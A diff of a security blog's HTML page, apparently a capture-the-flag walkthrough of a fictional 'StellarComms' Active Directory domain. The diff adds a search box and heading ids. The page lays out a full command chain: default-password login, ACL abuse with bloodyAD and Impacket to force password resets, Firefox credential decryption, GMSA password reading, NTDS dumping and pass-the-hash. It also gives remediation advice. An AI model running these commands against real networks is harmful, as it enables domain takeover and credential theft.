@@ -121,6 +121,16 @@
     <span class="cursor" id="term-cursor" aria-hidden="true"></span>
     <span class="sr-only">Zerotrace Logs</span>
   </h1>
+  <!-- Search Box -->
+  <div class="search-container">
+    <input type="search"
+           id="siteSearch"
+           class="search-input"
+           placeholder="Search walkthroughs..."
+           aria-label="Search walkthroughs"
+           autocomplete="off">
+    <div id="searchResults" class="search-results" hidden></div>
+  </div>
 </header>
 
 <!-- Side hamburger control -->
@@ -177,7 +187,7 @@
 <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
 
 <section>
-  <h2>StellarComms</h2>
+  <h2 id="stellarcomms">StellarComms</h2>
 
   <div class="machine-info">
     <ul>
@@ -188,16 +198,16 @@
     </ul>
   </div>
 
-  <h3>Overview</h3>
+  <h3 id="overview">Overview</h3>
   <p>Stellar Communications, a regional telecommunications provider, has engaged us to conduct a covert internal network penetration test. The client wants to assess the resilience of their Active Directory infrastructure against insider threats and compromised VPN endpoints.</p>
 
   <p>Our objective is to simulate a compromised remote worker scenario, enumerate Active Directory misconfigurations, pivot through the internal network, and ultimately compromise high-value targets including the domain controller.</p>
 
   <p><strong>Initial Access:</strong> Valid VPN access with a known username (<code>junior.analyst</code>), password unknown.</p>
 
-  <h2>Reconnaissance</h2>
+  <h2 id="reconnaissance">Reconnaissance</h2>
 
-  <h3><span class="step">[Step 1]</span> Port Scanning</h3>
+  <h3 id="port-scanning"><span class="step">[Step 1]</span> Port Scanning</h3>
   <p>We initiated a comprehensive port scan to identify open services on the target domain controller:</p>
   <pre><code>$ nmap -p- -T4 -sC -sV -Pn -o nmap_scan 10.1.248.71</code></pre>
 
@@ -215,9 +225,9 @@
 
   <p>The presence of anonymous FTP access on a domain controller (<code>DC-STELLAR.stellarcomms.local</code>) is unusual and warrants immediate investigation.</p>
 
-  <h2>FTP Enumeration</h2>
+  <h2 id="ftp-enumeration">FTP Enumeration</h2>
 
-  <h3><span class="step">[Step 2]</span> Anonymous FTP Access</h3>
+  <h3 id="anonymous-ftp"><span class="step">[Step 2]</span> Anonymous FTP Access</h3>
   <p>Connecting to the FTP service with anonymous credentials revealed accessible directories:</p>
   <pre><code>$ ftp 10.1.248.71
 # Username: anonymous
@@ -232,7 +242,7 @@
     <li><code>Pics/</code> - Pictures directory (nothing interesting)</li>
   </ul>
 
-  <h3><span class="step">[Step 3]</span> Extracting FTP Contents</h3>
+  <h3 id="extracting-ftp"><span class="step">[Step 3]</span> Extracting FTP Contents</h3>
   <p>To efficiently download all files without corruption, we configured binary mode and disabled interactive prompts:</p>
   <pre><code>ftp> binary
 200 Type set to I.
@@ -242,7 +252,7 @@ ftp> cd Docs
 250 CWD command successful.
 ftp> mget *</code></pre>
 
-  <h3><span class="step">[Step 4]</span> Document Analysis</h3>
+  <h3 id="document-analysis"><span class="step">[Step 4]</span> Document Analysis</h3>
   <p>The <code>Docs</code> directory yielded several critical intelligence files:</p>
 
   <h4>Browser_policy.pdf</h4>
@@ -274,9 +284,9 @@ will be logged and locked automatically.</code></pre>
   <p><strong>Default password:</strong> <code>Galaxy123!</code></p>
   <p>This represents a common security misconfiguration where default credentials are documented but not properly rotated by end users.</p>
 
-  <h2>Initial Foothold</h2>
+  <h2 id="initial-foothold">Initial Foothold</h2>
 
-  <h3><span class="step">[Step 5]</span> Testing Default Credentials</h3>
+  <h3 id="default-credentials"><span class="step">[Step 5]</span> Testing Default Credentials</h3>
   <p>We tested the default password against the known username using NetExec:</p>
   <pre><code>$ nxc smb 10.1.248.71 -u 'junior.analyst' -p 'Galaxy123!'</code></pre>
 
@@ -284,16 +294,16 @@ will be logged and locked automatically.</code></pre>
 
   <p><strong>Success!</strong> The credentials <code>junior.analyst:Galaxy123!</code> are valid.</p>
 
-  <h2>Active Directory Enumeration</h2>
+  <h2 id="ad-enumeration">Active Directory Enumeration</h2>
 
-  <h3><span class="step">[Step 6]</span> BloodHound Data Collection</h3>
+  <h3 id="bloodhound-collection"><span class="step">[Step 6]</span> BloodHound Data Collection</h3>
   <p>With valid domain credentials, we used NetExec to collect comprehensive AD data for BloodHound analysis:</p>
   <pre><code>$ nxc ldap 10.1.248.71 -u 'junior.analyst' -p 'Galaxy123!' \
   --bloodhound --collection All --dns-server 10.1.248.71</code></pre>
 
   <p>BloodHound ingestion and analysis revealed a multi-step privilege escalation path through ACL abuse.</p>
 
-  <h3><span class="step">[Step 7]</span> Attack Path Discovery</h3>
+  <h3 id="attack-path-discovery"><span class="step">[Step 7]</span> Attack Path Discovery</h3>
   <p>BloodHound identified a privilege escalation chain involving three critical relationships:</p>
 
   <h4>Step 1: WriteOwner on STELLAROPS-CONTROL Group</h4>
@@ -322,9 +332,9 @@ will be logged and locked automatically.</code></pre>
     → ForceChangePassword on ops.controller
     → WinRM access via Remote Management Users</code></pre>
 
-  <h2>Privilege Escalation: Part 1</h2>
+  <h2 id="privilege-escalation-part1">Privilege Escalation: Part 1</h2>
 
-  <h3><span class="step">[Step 8]</span> Exploiting WriteOwner ACL</h3>
+  <h3 id="writeowner-acl"><span class="step">[Step 8]</span> Exploiting WriteOwner ACL</h3>
   <p>Using Impacket's <code>owneredit.py</code>, we changed the owner of the <code>STELLAROPS-CONTROL</code> group to <code>junior.analyst</code>:</p>
   <pre><code>$ owneredit.py -action write -new-owner 'junior.analyst' \
   -target 'StellarOps-Control' \
@@ -339,7 +349,7 @@ will be logged and locked automatically.</code></pre>
 
   <p>The group's owner was successfully changed from <code>Domain Admins</code> to <code>junior.analyst</code>.</p>
 
-  <h3><span class="step">[Step 9]</span> Modifying Group DACL</h3>
+  <h3 id="modifying-dacl"><span class="step">[Step 9]</span> Modifying Group DACL</h3>
   <p>Now as the owner, we used <code>dacledit.py</code> to grant ourselves <code>WriteMembers</code> permissions:</p>
   <pre><code>$ dacledit.py -action 'write' -rights 'WriteMembers' \
   -principal 'junior.analyst' \
@@ -357,21 +367,21 @@ will be logged and locked automatically.</code></pre>
     Owning an object grants implicit WriteDACL permissions, allowing modification of the object's security descriptor. We're leveraging this to grant ourselves the ability to add members to the group.
   </div>
 
-  <h3><span class="step">[Step 10]</span> Adding Junior.Analyst to STELLAROPS-CONTROL</h3>
+  <h3 id="adding-group-member"><span class="step">[Step 10]</span> Adding Junior.Analyst to STELLAROPS-CONTROL</h3>
   <p>Using BloodyAD, we added <code>junior.analyst</code> to the group:</p>
   <pre><code>$ bloodyAD -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' \
   --host 10.1.248.71 add groupMember 'STELLAROPS-CONTROL' 'junior.analyst'
 
 [+] junior.analyst added to STELLAROPS-CONTROL</code></pre>
 
-  <h3><span class="step">[Step 11]</span> Forcing Password Reset on OPS.CONTROLLER</h3>
+  <h3 id="forcechangepassword"><span class="step">[Step 11]</span> Forcing Password Reset on OPS.CONTROLLER</h3>
   <p>Now as a member of <code>STELLAROPS-CONTROL</code>, we can force a password change on <code>ops.controller</code>:</p>
   <pre><code>$ bloodyAD -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' \
   --host 10.1.248.71 set password 'ops.controller' 'Zerotrace123!'
 
 [+] Password changed successfully!</code></pre>
 
-  <h3><span class="step">[Step 12]</span> Verification</h3>
+  <h3 id="verification"><span class="step">[Step 12]</span> Verification</h3>
   <p>Testing the new credentials:</p>
   <pre><code>$ nxc smb 10.1.248.71 -u 'ops.controller' -p 'Zerotrace123!'</code></pre>
 
@@ -379,9 +389,9 @@ will be logged and locked automatically.</code></pre>
 
   <p><strong>Authentication successful!</strong> We now control the <code>ops.controller</code> account.</p>
 
-  <h2>Establishing WinRM Session</h2>
+  <h2 id="winrm-session">Establishing WinRM Session</h2>
 
-  <h3><span class="step">[Step 13]</span> WinRM Access</h3>
+  <h3 id="winrm-access"><span class="step">[Step 13]</span> WinRM Access</h3>
   <p>Since <code>ops.controller</code> is a member of the Remote Management Users group, we can establish a WinRM session:</p>
   <pre><code>$ evil-winrm -i 10.1.248.71 -u 'ops.controller' -p 'Zerotrace123!'</code></pre>
 
@@ -393,9 +403,9 @@ will be logged and locked automatically.</code></pre>
 
   <p><strong>User flag captured!</strong></p>
 
-  <h2>Credential Harvesting: Firefox Profile</h2>
+  <h2 id="firefox-credentials">Credential Harvesting: Firefox Profile</h2>
 
-  <h3><span class="step">[Step 14]</span> Locating Firefox Profile</h3>
+  <h3 id="locating-firefox-profile"><span class="step">[Step 14]</span> Locating Firefox Profile</h3>
   <p>Based on the browser policy documentation, we know Firefox ESR is the approved browser. Firefox stores saved credentials in the user's profile directory.</p>
 
   <p>Enumerating Firefox profiles:</p>
@@ -422,7 +432,7 @@ will be logged and locked automatically.</code></pre>
     To decrypt the credentials, we need both files.
   </div>
 
-  <h3><span class="step">[Step 15]</span> Extracting Credential Files</h3>
+  <h3 id="extracting-credential-files"><span class="step">[Step 15]</span> Extracting Credential Files</h3>
   <p>Using Evil-WinRM's download function:</p>
   <pre><code>*Evil-WinRM* PS> cd C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr
 *Evil-WinRM* PS> download logins.json
@@ -433,7 +443,7 @@ will be logged and locked automatically.</code></pre>
 $ mv logins.json user_firefox_db/
 $ mv key4.db user_firefox_db/</code></pre>
 
-  <h3><span class="step">[Step 16]</span> Decrypting Firefox Credentials</h3>
+  <h3 id="decrypting-firefox-credentials"><span class="step">[Step 16]</span> Decrypting Firefox Credentials</h3>
   <p>Using the <code>firepwd</code> tool:</p>
   <pre><code>$ python firepwd/firepwd.py -d user_firefox_db
 
@@ -450,16 +460,16 @@ http://portal.stellarcomms.local:b'astro.researcher',b'[REDACTED]'</code></pre>
     <li><strong>Password:</strong> [REDACTED]</li>
   </ul>
 
-  <h3><span class="step">[Step 17]</span> Validating New Credentials</h3>
+  <h3 id="validating-credentials"><span class="step">[Step 17]</span> Validating New Credentials</h3>
   <pre><code>$ nxc smb 10.1.248.71 -u 'astro.researcher' -p '[REDACTED]'</code></pre>
 
   <p><img src="../assets/stellarcomms/astro-researcher-validated.png" alt="astro.researcher credentials validated"></p>
 
   <p><strong>Authentication successful!</strong> The <code>astro.researcher</code> account is valid.</p>
 
-  <h2>Privilege Escalation: Part 2</h2>
+  <h2 id="privilege-escalation-part2">Privilege Escalation: Part 2</h2>
 
-  <h3><span class="step">[Step 18]</span> BloodHound Analysis of Astro.Researcher</h3>
+  <h3 id="bloodhound-analysis"><span class="step">[Step 18]</span> BloodHound Analysis of Astro.Researcher</h3>
   <p>Analyzing the <code>astro.researcher</code> account in BloodHound revealed another privilege escalation path:</p>
 
   <p><img src="../assets/stellarcomms/astro-researcher-path.png" alt="BloodHound showing astro.researcher attack path to GMSA"></p>
@@ -477,7 +487,7 @@ http://portal.stellarcomms.local:b'astro.researcher',b'[REDACTED]'</code></pre>
     GMSAs are special Active Directory accounts designed for services. The domain automatically manages their passwords (typically 240 characters, rotated every 30 days). However, principals with <code>ReadGMSAPassword</code> permissions can retrieve the current password, which is essentially a hash that can be used for authentication.
   </div>
 
-  <h3><span class="step">[Step 19]</span> Abusing WriteDacl</h3>
+  <h3 id="writedacl-abuse"><span class="step">[Step 19]</span> Abusing WriteDacl</h3>
   <p>Using BloodyAD to grant ourselves <code>GenericAll</code> permissions on <code>eng.payload</code>:</p>
   <pre><code>$ bloodyAD --host 10.1.248.71 -d stellarcomms.local \
   -u 'astro.researcher' -p '[REDACTED]' \
@@ -492,7 +502,7 @@ http://portal.stellarcomms.local:b'astro.researcher',b'[REDACTED]'</code></pre>
     <code>GenericAll</code> is a superset permission that includes all possible rights on an object, including the ability to reset passwords, modify attributes, and read all properties.
   </div>
 
-  <h3><span class="step">[Step 20]</span> Forcing Password Reset on ENG.PAYLOAD</h3>
+  <h3 id="password-reset-eng-payload"><span class="step">[Step 20]</span> Forcing Password Reset on ENG.PAYLOAD</h3>
   <pre><code>$ bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local \
   -u 'astro.researcher' -p '[REDACTED]' \
   set password 'eng.payload' 'Zerotrace123@!'
@@ -501,9 +511,9 @@ http://portal.stellarcomms.local:b'astro.researcher',b'[REDACTED]'</code></pre>
 
   <p>We now control the <code>eng.payload</code> account with the password <code>Zerotrace123@!</code>.</p>
 
-  <h2>Domain Compromise</h2>
+  <h2 id="domain-compromise">Domain Compromise</h2>
 
-  <h3><span class="step">[Step 21]</span> Reading GMSA Password</h3>
+  <h3 id="gmsa-password"><span class="step">[Step 21]</span> Reading GMSA Password</h3>
   <p>Using the compromised <code>eng.payload</code> account, we can now read the GMSA password for <code>SATLINK-SERVICE$</code>:</p>
   <pre><code>$ bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local \
   -u 'eng.payload' -p 'Zerotrace123@!' \
@@ -520,7 +530,7 @@ msDS-ManagedPassword.B64ENCODED: [REDACTED]</code></pre>
     GMSA accounts often have elevated privileges for service operations. In this case, the <code>SATLINK-SERVICE$</code> account has DCSync rights or equivalent privileges to extract the entire domain database. The GMSA hash can be used directly for Pass-the-Hash authentication.
   </div>
 
-  <h3><span class="step">[Step 22]</span> NTDS.dit Extraction</h3>
+  <h3 id="dcsync"><span class="step">[Step 22]</span> NTDS.dit Extraction</h3>
   <p>Using Impacket's <code>secretsdump</code> with the GMSA hash to extract the NTDS.dit database:</p>
   <pre><code>$ impacket-secretsdump -hashes :'[REDACTED]' \
   -dc-ip DC-STELLAR.stellarcomms.local \
@@ -544,7 +554,7 @@ eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>
 
   <p>We now have the NTLM hash for the <code>Administrator</code> account!</p>
 
-  <h3><span class="step">[Step 23]</span> Administrator Access via Pass-the-Hash</h3>
+  <h3 id="pass-the-hash"><span class="step">[Step 23]</span> Administrator Access via Pass-the-Hash</h3>
   <p>Using Evil-WinRM with the Administrator hash:</p>
   <pre><code>$ evil-winrm -i 10.1.248.71 -u Administrator -H [REDACTED]</code></pre>
 
@@ -555,7 +565,7 @@ eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>
 
   <p><strong>Root flag captured!</strong> Complete domain compromise achieved.</p>
 
-  <h2>Attack Chain Summary</h2>
+  <h2 id="attack-chain-summary">Attack Chain Summary</h2>
   <div class="attack-chain">
     <ol>
       <li><strong>Anonymous FTP Access</strong> - Discovered documentation with default credentials</li>
@@ -576,7 +586,7 @@ eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>
     </ol>
   </div>
 
-  <h2>Key Vulnerabilities Identified</h2>
+  <h2 id="vulnerabilities">Key Vulnerabilities Identified</h2>
 
   <h4>1. Anonymous FTP Access on Domain Controller</h4>
   <p><strong>Risk:</strong> Critical</p>
@@ -608,7 +618,7 @@ eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>
   <p><strong>Issue:</strong> The GMSA account had DCSync privileges, allowing complete domain database extraction.</p>
   <p><strong>Remediation:</strong> Apply least privilege principles to service accounts. Service accounts should not have domain-wide replication rights unless absolutely necessary.</p>
 
-  <h2>Tools Used</h2>
+  <h2 id="tools-used">Tools Used</h2>
   <ul class="tools-grid">
     <li><strong>nmap</strong> - Network reconnaissance and port scanning</li>
     <li><strong>NetExec (nxc)</strong> - SMB authentication testing and BloodHound data collection</li>
@@ -621,9 +631,9 @@ eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>
     <li><strong>firepwd</strong> - Firefox credential decryption tool</li>
   </ul>
 
-  <h2>Lessons Learned</h2>
+  <h2 id="lessons-learned">Lessons Learned</h2>
 
-  <h3><span class="step pentester">For Pentesters</span></h3>
+  <h3 id="for-pentesters"><span class="step pentester">For Pentesters</span></h3>
   <ul>
     <li><strong>Always enumerate thoroughly</strong> - The anonymous FTP access provided critical intelligence that enabled the entire attack chain</li>
     <li><strong>BloodHound is essential</strong> - Manual ACL enumeration would have been extremely time-consuming. BloodHound quickly identified the multi-hop privilege escalation path</li>
@@ -632,7 +642,7 @@ eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>
     <li><strong>Chain multiple low-risk findings</strong> - Each individual misconfiguration (WriteOwner, WriteDacl, ForceChangePassword) might seem minor, but chaining them together leads to complete domain compromise</li>
   </ul>
 
-  <h3><span class="step defender">For Defenders</span></h3>
+  <h3 id="for-defenders"><span class="step defender">For Defenders</span></h3>
   <ul>
     <li><strong>Principle of Least Privilege</strong> - Review and remove unnecessary ACL permissions. Users should not have WriteOwner or WriteDacl on security groups</li>
     <li><strong>Secure Default Credentials</strong> - Never document default passwords in accessible locations. Enforce password changes on first login</li>
@@ -642,7 +652,7 @@ eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>
     <li><strong>Service Hardening</strong> - Domain controllers should not run unnecessary services like FTP. Minimize the attack surface</li>
   </ul>
 
-  <h2>Conclusion</h2>
+  <h2 id="conclusion">Conclusion</h2>
   <p>The StellarComms machine provided an excellent demonstration of modern Active Directory exploitation techniques. The attack chain required:</p>
   <ul>
     <li>Thorough enumeration and OSINT collection</li>
